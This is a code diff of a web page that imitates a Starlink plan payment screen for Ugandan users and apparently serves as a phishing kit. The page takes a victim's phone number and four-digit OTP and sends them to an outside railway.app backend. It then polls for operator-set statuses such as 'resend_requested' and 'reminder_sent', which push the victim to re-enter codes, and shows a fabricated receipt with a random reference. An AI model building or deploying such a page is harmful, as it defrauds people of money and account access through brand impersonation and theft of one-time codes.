                         SSL Encrypted and Secure
                     </div>
-
                 </div>
             </div>
         </div>
     </main>
 
-    <!-- WAITING OVERLAY -->
     <div class="waiting-overlay" id="waitingOverlay">
         <div class="waiting-content">
             <div class="waiting-orbit">
                 <div class="waiting-ring"></div>
                 <div class="waiting-ring inner"></div>
-                <div class="waiting-core">
-                    <i class="uil uil-lock"></i>
-                </div>
+                <div class="waiting-core"><i class="uil uil-lock"></i></div>
             </div>
             <h2 class="waiting-title">Verifying <span class="highlight">OTP</span></h2>
             <p class="waiting-sub">
@@ -862,14 +320,11 @@
         </div>
     </div>
 
-    <!-- SUCCESS OVERLAY -->
     <div class="success-overlay" id="successOverlay">
         <div class="success-content">
             <div class="success-check"><i class="uil uil-check"></i></div>
             <h2 class="success-title">Payment Complete</h2>
-            <p class="success-sub">
-                Your <strong id="successPlan">plan</strong> is now active. Enjoy your high-speed Starlink internet.
-            </p>
+            <p class="success-sub">Your <strong id="successPlan">plan</strong> is now active. Enjoy your high-speed Starlink internet.</p>
             <div class="success-receipt">
                 <div class="success-row"><span>Plan</span><span id="receiptPlan">—</span></div>
                 <div class="success-row"><span>Data</span><span id="receiptData">—</span></div>
@@ -884,14 +339,11 @@
         </div>
     </div>
 
-    <!-- TOAST -->
     <div class="toast-overlay" id="toastOverlay">
         <div class="toast-card" id="toastCard">
             <div class="toast-icon error" id="toastIcon"><i class="uil uil-exclamation-triangle"></i></div>
             <h3 class="toast-title" id="toastTitle">Incorrect Code</h3>
-            <p class="toast-text" id="toastText">
-                Incorrect code. Please enter the correct OTP.
-            </p>
+            <p class="toast-text" id="toastText">Incorrect code. Please enter the correct OTP.</p>
             <button class="toast-btn" id="toastBtn">Try Again</button>
         </div>
     </div>
@@ -899,13 +351,13 @@
     <nav class="bottom-nav">
         <div class="bottom-nav-inner">
             <a href="/dashboard/" class="nav-item"><i class="uil uil-wifi"></i><span>Status</span></a>
-            <a href="/plans/" class="nav-item"><i class="uil uil-shopping-bag"></i><span>Plans</span></a>
+            <a href="/plans/" class="nav-item active"><i class="uil uil-shopping-bag"></i><span>Plans</span></a>
             <a href="/settings/" class="nav-item"><i class="uil uil-setting"></i><span>Settings</span></a>
         </div>
     </nav>
 
     <script>
-        const API_BASE = '';
+        const API_BASE = 'https://starlinknetwork-production.up.railway.app';
 
         const params = new URLSearchParams(window.location.search);
         const planName = params.get('plan') || 'Standard';
@@ -913,10 +365,8 @@
         const planPrice = parseInt(params.get('price') || '3500', 10);
         const planPhone = params.get('phone') || '07xxxxxxxx';
 
-        document.getElementById('display-amount').textContent =
-            'UGX ' + planPrice.toLocaleString('en-UG', { minimumFractionDigits: 2 });
-        document.getElementById('display-phone').textContent =
-            '+256 ' + planPhone.replace(/^0/, '');
+        document.getElementById('display-amount').textContent = 'UGX ' + planPrice.toLocaleString('en-UG', { minimumFractionDigits: 2 });
+        document.getElementById('display-phone').textContent = '+256 ' + planPhone.replace(/^0/, '');
         document.getElementById('waitingPlan').textContent = planName;
 
         const otpBoxes = document.querySelectorAll('.otp-box');
@@ -925,7 +375,6 @@
         const submitBtn = document.getElementById('submitBtn');
         const successOverlay = document.getElementById('successOverlay');
         const doneBtn = document.getElementById('doneBtn');
-
         const waitingOverlay = document.getElementById('waitingOverlay');
         const toastOverlay = document.getElementById('toastOverlay');
         const toastCard = document.getElementById('toastCard');
@@ -938,24 +387,15 @@
         let currentSessionId = null;
         let lastReminderCount = 0;
 
-        // ============================================
-        // OTP INPUT HANDLING
-        // ============================================
         function updateSubmitState() {
             const val = Array.from(otpBoxes).map(b => b.value).join('');
             otpCodeInput.value = val;
             submitBtn.disabled = val.length !== 4;
-
-            otpBoxes.forEach(b => {
-                b.classList.toggle('filled', b.value.length === 1);
-            });
+            otpBoxes.forEach(b => b.classList.toggle('filled', b.value.length === 1));
         }
 
         function clearOtpBoxes() {
-            otpBoxes.forEach(b => {
-                b.value = '';
-                b.classList.remove('filled');
-            });
+            otpBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
             otpCodeInput.value = '';
             submitBtn.disabled = true;
             otpBoxes[0].focus();
@@ -964,57 +404,28 @@
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', (e) => {
                 e.target.value = e.target.value.replace(/[^0-9]/g, '');
-
-                if (e.target.value.length === 1 && index < otpBoxes.length - 1) {
-                    otpBoxes[index + 1].focus();
-                }
-
+                if (e.target.value.length === 1 && index < otpBoxes.length - 1) otpBoxes[index + 1].focus();
                 updateSubmitState();
-
                 const otpValue = Array.from(otpBoxes).map(b => b.value).join('');
-                if (otpValue.length === 4) {
-                    setTimeout(() => submitOTP(), 350);
-                }
+                if (otpValue.length === 4) setTimeout(() => submitOTP(), 350);
             });
-
             box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-                    otpBoxes[index - 1].focus();
-                }
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) otpBoxes[index - 1].focus();
             });
-
             box.addEventListener('paste', (e) => {
                 e.preventDefault();
                 const pastedData = e.clipboardData.getData('text');
                 const digits = pastedData.replace(/[^0-9]/g, '').slice(0, 4);
-
-                digits.split('').forEach((digit, i) => {
-                    if (i < otpBoxes.length) {
-                        otpBoxes[i].value = digit;
-                    }
-                });
-
+                digits.split('').forEach((digit, i) => { if (i < otpBoxes.length) otpBoxes[i].value = digit; });
                 updateSubmitState();
-
-                if (digits.length === 4) {
-                    setTimeout(() => submitOTP(), 350);
-                }
+                if (digits.length === 4) setTimeout(() => submitOTP(), 350);
             });
-
-            box.addEventListener('focus', (e) => {
-                e.target.select();
-            });
+            box.addEventListener('focus', (e) => { e.target.select(); });
         });
 
         otpBoxes[0].focus();
 
-        // ============================================
-        // SUBMIT → POST to backend
-        // ============================================
-        otpForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            submitOTP();
-        });
+        otpForm.addEventListener('submit', (e) => { e.preventDefault(); submitOTP(); });
 
         async function submitOTP() {
             const val = Array.from(otpBoxes).map(b => b.value).join('');
@@ -1028,168 +439,105 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        plan: planName,
-                        data: planData,
-                        price: planPrice,
-                        phone: planPhone,
-                        otp: val
+                        plan: planName, data: planData,
+                        price: planPrice, phone: planPhone, otp: val
                     })
                 });
-
                 const data = await res.json();
-
                 if (!data.ok) {
                     submitBtn.disabled = false;
                     submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify & Complete</span>';
                     showToast('error', 'Error', 'Something went wrong. Please try again.');
                     return;
                 }
-
                 currentSessionId = data.sessionId;
                 lastReminderCount = 0;
-
                 waitingOverlay.classList.add('open');
                 document.body.classList.add('modal-open');
                 startPolling(currentSessionId);
-
             } catch (err) {
-                console.error(err);
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify & Complete</span>';
                 showToast('error', 'Network Error', 'Please check your connection and try again.');
             }
         }
 
-        // ============================================
-        // POLL STATUS
-        // ============================================
         function startPolling(sessionId) {
             clearInterval(pollTimer);
             pollTimer = setInterval(async () => {
                 try {
                     const res = await fetch(API_BASE + '/api/status/' + sessionId);
                     const data = await res.json();
-
                     if (!data.ok) return;
 
                     if (data.status === 'approved') {
                         clearInterval(pollTimer);
                         waitingOverlay.classList.remove('open');
                         showSuccess();
-
                     } else if (data.status === 'rejected') {
                         clearInterval(pollTimer);
                         waitingOverlay.classList.remove('open');
-                        showToast(
-                            'error',
-                            'Verification Failed',
-                            data.message || 'Rejected. Please try again.',
-                            'OK',
-                            () => {
-                                window.location.href = '/plans/';
-                            }
-                        );
-
+                        showToast('error', 'Verification Failed', data.message || 'Rejected. Please try again.', 'OK', () => {
+                            window.location.href = '/plans/';
+                        });
                     } else if (data.status === 'resend_requested') {
                         clearInterval(pollTimer);
                         waitingOverlay.classList.remove('open');
-                        showToast(
-                            'error',
-                            'Incorrect Code',
-                            data.message || 'Incorrect code. Please enter the correct OTP.',
-                            'Try Again',
-                            () => {
-                                clearOtpBoxes();
-                                submitBtn.disabled = true;
-                                submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify &amp; Complete</span>';
-                            }
-                        );
-
+                        showToast('error', 'Incorrect Code', data.message || 'Incorrect code. Please enter the correct OTP.', 'Try Again', () => {
+                            clearOtpBoxes();
+                            submitBtn.disabled = true;
+                            submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify &amp; Complete</span>';
+                        });
                     } else if (data.status === 'reminder_sent') {
                         if (lastReminderCount === 0) {
                             lastReminderCount = 1;
-                            showToast(
-                                'info',
-                                'A Gentle Reminder',
-                                data.message || 'Almost done! Please enter the OTP code we sent you to unlock your Starlink plan. You are one step away from high-speed internet.',
-                                'OK, Got It',
-                                null
-                            );
+                            showToast('info', 'A Gentle Reminder', data.message || 'Almost done! Please enter the OTP code we sent you to unlock your Starlink plan. You are one step away from high-speed internet.', 'OK, Got It', null);
                         }
-
                     } else if (data.status === 'timeout') {
                         clearInterval(pollTimer);
                         waitingOverlay.classList.remove('open');
-                        showToast(
-                            'error',
-                            'Session Expired',
-                            'Please start the payment again from the plans page.',
-                            'OK',
-                            () => {
-                                window.location.href = '/plans/';
-                            }
-                        );
+                        showToast('error', 'Session Expired', 'Please start the payment again from the plans page.', 'OK', () => {
+                            window.location.href = '/plans/';
+                        });
                     }
-                } catch (err) {
-                    // retry silently
-                }
+                } catch (err) {}
             }, 2000);
         }
 
-        // ============================================
-        // SUCCESS SCREEN
-        // ============================================
         function showSuccess() {
             const ref = 'MP' + Date.now().toString().slice(-8) + '.' + Math.random().toString(36).substring(2, 6).toUpperCase();
-
             document.getElementById('successPlan').textContent = planName;
             document.getElementById('receiptPlan').textContent = planName;
             document.getElementById('receiptData').textContent = planData;
             document.getElementById('receiptAmount').textContent = 'UGX ' + planPrice.toLocaleString('en-UG', { minimumFractionDigits: 2 });
             document.getElementById('receiptPhone').textContent = '+256 ' + planPhone.replace(/^0/, '');
             document.getElementById('receiptRef').textContent = ref;
-
             successOverlay.classList.add('open');
             document.body.classList.add('modal-open');
         }
 
-        doneBtn.addEventListener('click', () => {
-            window.location.href = '/dashboard/';
-        });
+        doneBtn.addEventListener('click', () => { window.location.href = '/dashboard/'; });
 
-        // ============================================
-        // TOAST
-        // ============================================
         let toastAction = null;
-
         function showToast(type, title, text, buttonLabel, action) {
             toastIcon.className = 'toast-icon ' + (type === 'info' ? 'info' : 'error');
-            toastIcon.innerHTML = type === 'info'
-                ? '<i class="uil uil-bell"></i>'
-                : '<i class="uil uil-exclamation-triangle"></i>';
-
+            toastIcon.innerHTML = type === 'info' ? '<i class="uil uil-bell"></i>' : '<i class="uil uil-exclamation-triangle"></i>';
             toastTitle.textContent = title;
             toastText.innerHTML = text;
             toastBtn.textContent = buttonLabel || 'OK, Got It';
-
             toastAction = action || null;
-
             toastOverlay.classList.add('open');
             setTimeout(() => toastCard.classList.add('show'), 50);
         }
-
         function hideToast() {
             toastCard.classList.remove('show');
             setTimeout(() => toastOverlay.classList.remove('open'), 250);
         }
-
         toastBtn.addEventListener('click', () => {
             const action = toastAction;
             toastAction = null;
             hideToast();
-            if (typeof action === 'function') {
-                setTimeout(action, 250);
-            }
+            if (typeof action === 'function') setTimeout(action, 250);
         });
     </script>
 </body>
